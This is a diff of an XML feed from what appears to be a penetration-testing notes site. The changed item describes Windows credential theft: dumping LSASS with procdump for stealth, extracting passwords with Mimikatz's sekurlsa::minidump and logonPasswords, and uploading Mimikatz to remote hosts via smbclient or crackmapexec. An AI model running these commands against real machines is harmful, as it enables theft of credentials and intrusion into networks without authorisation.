@@ -44,7 +44,7 @@ Local Exploit Suggester # You can feed syteminfo output to windows-exploit-sugge
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/lsass_mimikatz/</guid>
-      <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp 
+      <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp # Several dumping methods here https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/ 
 Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz # sekurlsa::minidump lsass.DMP mimikatz # sekurlsa::logonPasswords /full # You can upload mimikatz to a remote machine with smbclient # Or you can use crackmapexec # Executon may fail but the binary will be uploaded in C:\\Windows\\mimikatz.</description>
     </item>
     
